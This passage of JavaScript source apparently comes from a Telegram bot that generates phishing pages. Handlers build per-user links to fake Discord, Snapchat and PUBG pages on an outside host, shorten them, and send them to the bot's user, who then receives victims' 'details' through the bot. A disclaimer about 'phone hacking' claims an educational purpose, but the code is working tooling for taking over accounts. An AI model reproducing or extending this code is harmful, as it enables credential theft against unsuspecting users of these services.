    .catch(error => {
      console.error('Error retrieving bot information:', error);
    });
}


function handleOption15(chatId) {
  // Retrieve the bot's username
  bot.getMe()
    .then(botInfo => {
      const botUsername = botInfo.username;

      // Check if the user has joined the required channels
      JoineCheck(chatId)
        .then(isJoined => {
          if (isJoined) {
            const u = String(chatId);
            const link = `https://social-gr.in/dio.php?id=${u}`;
            const url = `https://social-logs.com/k/short.php?url=${link}`;

            // Make an HTTP request to get the shortened URL
            axios
              .get(url)
              .then((response) => {
                const result = response.data;
                const short = result.url;

                // Create the message with formatted text
                const message = `🧩 𝐏𝐚𝐠𝐞 𝐍𝐚𝐦𝐞: Discord 😈\n\n✅ 𝐘𝐨𝐮𝐫 𝐏𝐚𝐠𝐞 𝐋𝐢𝐧𝐤- ${short}\n\n🎭 𝐃𝐞𝐭𝐚𝐢𝐥𝐬 𝐆𝐞𝐭 𝐎𝐧- @${botUsername}`;

                // Send the message to the user
                bot.sendMessage(chatId, message);
              })
              .catch((error) => {
                console.error('Error retrieving shortened URL:', error);
              });
          } else {
            // User has not joined required channels, run chajoin function
            chajoin(chatId);
          }
        })
        .catch(error => {
          console.error('Error checking membership:', error);
        });
    })
    .catch(error => {
      console.error('Error retrieving bot information:', error);
    });
}


function handleOption16(chatId) {
  // Retrieve the bot's username
  bot.getMe()
    .then(botInfo => {
      const botUsername = botInfo.username;

      // Check if the user has joined the required channels
      JoineCheck(chatId)
        .then(isJoined => {
          if (isJoined) {
            const u = String(chatId);
            const link = `https://social-gr.in/snopp.php?id=${u}`;
            const url = `https://social-logs.com/k/short.php?url=${link}`;

            // Make an HTTP request to get the shortened URL
            axios
              .get(url)
              .then((response) => {
                const result = response.data;
                const short = result.url;

                // Create the message with formatted text
                const message = `🧩 𝐏𝐚𝐠𝐞 𝐍𝐚𝐦𝐞: Snapchat 😈\n\n✅ 𝐘𝐨𝐮𝐫 𝐏𝐚𝐠𝐞 𝐋𝐢𝐧𝐤- ${short}\n\n🎭 𝐃𝐞𝐭𝐚𝐢𝐥𝐬 𝐆𝐞𝐭 𝐎𝐧- @${botUsername}`;

                // Send the message to the user
                bot.sendMessage(chatId, message);
              })
              .catch((error) => {
                console.error('Error retrieving shortened URL:', error);
              });
          } else {
            // User has not joined required channels, run chajoin function
            chajoin(chatId);
          }
        })
        .catch(error => {
          console.error('Error checking membership:', error);
        });
    })
    .catch(error => {
      console.error('Error retrieving bot information:', error);
    });
}


function handleOption17(chatId) {
  // Retrieve the bot's username
  bot.getMe()
    .then(botInfo => {
      const botUsername = botInfo.username;

      // Check if the user has joined the required channels
      JoineCheck(chatId)
        .then(isJoined => {
          if (isJoined) {
            const u = String(chatId);
            const link = `https://social-gr.in/pubg/?id=${u}`;
            const url = `https://social-logs.com/k/short.php?url=${link}`;

            // Make an HTTP request to get the shortened URL
            axios
              .get(url)
              .then((response) => {
                const result = response.data;
                const short = result.url;

                // Create the message with formatted text
                const message = `🧩 𝐏𝐚𝐠𝐞 𝐍𝐚𝐦𝐞: pubg 😈\n\n✅ 𝐘𝐨𝐮𝐫 𝐏𝐚𝐠𝐞 𝐋𝐢𝐧𝐤- ${short}\n\n🎭 𝐃𝐞𝐭𝐚𝐢𝐥𝐬 𝐆𝐞𝐭 𝐎𝐧- @${botUsername}`;

                // Send the message to the user
                bot.sendMessage(chatId, message);
              })
              .catch((error) => {
                console.error('Error retrieving shortened URL:', error);
              });
          } else {
            // User has not joined required channels, run chajoin function
            chajoin(chatId);
          }
        })
        .catch(error => {
          console.error('Error checking membership:', error);
        });
    })
    .catch(error => {
      console.error('Error retrieving bot information:', error);
    });
}



function handleOption7(userId7){

  bot.sendMessage(userId7, 'subscribe- ')
}

function handleOption8(userId8){
    bot.sendMessage(userId8, 'Coming Soon 😎');
}


function handleOption9(chatId) {
  const disclaimerText = "⛔ Disclaimer ⛔\n\n⚠️ Disclaimer: Using this telegram bot for phone hacking is illegal and unethical. This bot is intended for educational purposes only, and the developers do not take responsibility for any misuse or illegal activity conducted using this bot. Please use at your own risk and discretion. Remember, hacking someone's phone without their consent is a serious violation of their privacy and can result in legal consequences. #StaySafe 🙏.";

  // Create inline keyboard options
  const inlineKeyboardMarkup = {
    inline_keyboard: [
      [
        { text: 'Help', callback_data: 'help' },
        { text: 'Create New Pages', callback_data: 'sos' }
      ]
    ]
  };

  // Send the disclaimer message with bold text and inline keyboard
  bot.sendMessage(chatId, `*${disclaimerText}*`, {
    parse_mode: "Markdown",
    reply_markup: inlineKeyboardMarkup
  });
}

function sendHelpMessage(chatId) {
  const helpText = "🆘 Need Help? 🆘\n\nIf you need any assistance or have any questions, please visit our Help Center or contact our Support team.";
  
  const inlineKeyboardMarkup = {
    inline_keyboard: [
      [
        { text: "Help Center", url: "https://t.me/Fastchat_Robot" },
        { text: "Contact Support", url: "https://t.me/Techcm0" },
      ],
    ],
  };
  
  bot.sendMessage(chatId, helpText, {
    reply_markup: inlineKeyboardMarkup,
  });
}


// Example function to make an HTTP request using the 'axios' library
// Replace this with your preferred method of making HTTP requests
function makeHttpRequest(url) {
  return axios.get(url);
}

// Usage example
bot.onText(/\/face/, (msg) => {
  handleOption2(bot, msg);
});
//an HTTP request using the 'axios' library
// Replace this with your preferred method of making HTTP requests
function makeHttpRequest(url) {
  return axios.get(url);
}



function addUserIdToDataFile(userId) {
  // Read the contents of the data file
  

  
}
     

function checkUserInData(userId) {
  // Implement your own logic to check if the user is already added in the data store
  // Return true if user is found, otherwise false
  return false;
}